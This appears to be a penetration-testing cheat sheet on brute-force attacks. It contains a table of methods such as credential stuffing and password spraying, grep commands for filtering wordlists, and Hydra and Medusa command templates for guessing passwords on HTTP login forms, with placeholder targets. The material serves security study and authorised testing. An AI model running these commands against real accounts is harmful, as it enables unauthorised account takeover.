# Brute Force Attack

### Types of Brute Forcing <a href="#types-of-brute-forcing" id="types-of-brute-forcing"></a>

<table><thead><tr><th width="126.42840576171875">Method</th><th>Description</th><th>Example</th><th>Best Used When...</th></tr></thead><tbody><tr><td><code>Simple Brute Force</code></td><td>Systematically tries all possible combinations of characters within a defined character set and length range.</td><td>Trying all combinations of lowercase letters from 'a' to 'z' for passwords of length 4 to 6.</td><td>No prior information about the password is available, and computational resources are abundant.</td></tr><tr><td><code>Dictionary Attack</code></td><td>Uses a pre-compiled list of common words, phrases, and passwords.</td><td>Trying passwords from a list like 'rockyou.txt' against a login form.</td><td>The target will likely use a weak or easily guessable password based on common patterns.</td></tr><tr><td><code>Hybrid Attack</code></td><td>Combines elements of simple brute force and dictionary attacks, often appending or prepending characters to dictionary words.</td><td>Adding numbers or special characters to the end of words from a dictionary list.</td><td>The target might use a slightly modified version of a common password.</td></tr><tr><td><code>Credential Stuffing</code></td><td>Leverages leaked credentials from one service to attempt access to other services, assuming users reuse passwords.</td><td>Using a list of usernames and passwords leaked from a data breach to try logging into various online accounts.</td><td>A large set of leaked credentials is available, and the target is suspected of reusing passwords across multiple services.</td></tr><tr><td><code>Password Spraying</code></td><td>Attempts a small set of commonly used passwords against a large number of usernames.</td><td>Trying passwords like 'password123' or 'qwerty' against all usernames in an organization.</td><td>Account lockout policies are in place, and the attacker aims to avoid detection by spreading attempts across multiple accounts.</td></tr><tr><td><code>Rainbow Table Attack</code></td><td>Uses pre-computed tables of password hashes to reverse hashes and recover plaintext passwords quickly.</td><td>Pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches.</td><td>A large number of password hashes need to be cracked, and storage space for the rainbow tables is available.</td></tr><tr><td><code>Reverse Brute Force</code></td><td>Targets a single password against multiple usernames, often used in conjunction with credential stuffing attacks.</td><td>Using a leaked password from one service to try logging into multiple accounts with different usernames.</td><td>A strong suspicion exists that a particular password is being reused across multiple accounts.</td></tr><tr><td><code>Distributed Brute Force</code></td><td>Distributes the brute forcing workload across multiple computers or devices to accelerate the process.</td><td>Using a cluster of computers to perform a brute-force attack significantly increases the number of combinations that can be tried per second.</td><td>The target password or key is highly complex, and a single machine lacks the computational power to crack it within a reasonable timeframe.</td></tr></tbody></table>

### Wordlist Filtering Commands

* <pre class="language-shellscript" data-line-numbers><code class="lang-shellscript">## min len = 8
  grep -E '^.{8,}$' wordlist.txt > new_wordlist.txt
  ## Min 1 Upper-Case
  grep -E '[A-Z]' wordlist.txt > new_wordlist.txt
  ## Min 1 Lower-Case
  grep -E '[a-z]' wordlist.txt > new_wordlist.txt
  grep -E '[0-9]' wordlist.txt > new_wordlist.txt
  </code></pre>



### Tools

{% tabs %}
{% tab title="Hydra" %}
```shellscript
## POST Method
hydra [options] target http-post-form "path:params:condition_string"
## Failure Condition
hydra -L users.txt -P pass.txt <IP> -s <port> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
## Sucess Condition
hydra -l admin -P passwords.txt <IP> -s <port> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
## Get Method Authentication - Basic <base64value>
hydra -L usernames.txt -P passwords.txt <URL> http-get /<path>
```
{% endtab %}

{% tab title="Medusa" %}
{% code lineNumbers="true" %}
```shellscript
medusa [target_options] [credential_options] -M module [module_options]
## Basic HTTP
medusa -M http -h <IP/URL> -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^
## Web-Form
medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
## Get Method Authentication - Basic <base64value>
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
medusa -h <IP/URL> -U usernames.txt -P passwords.txt -M http -m GET
```
{% endcode %}
{% endtab %}
{% endtabs %}
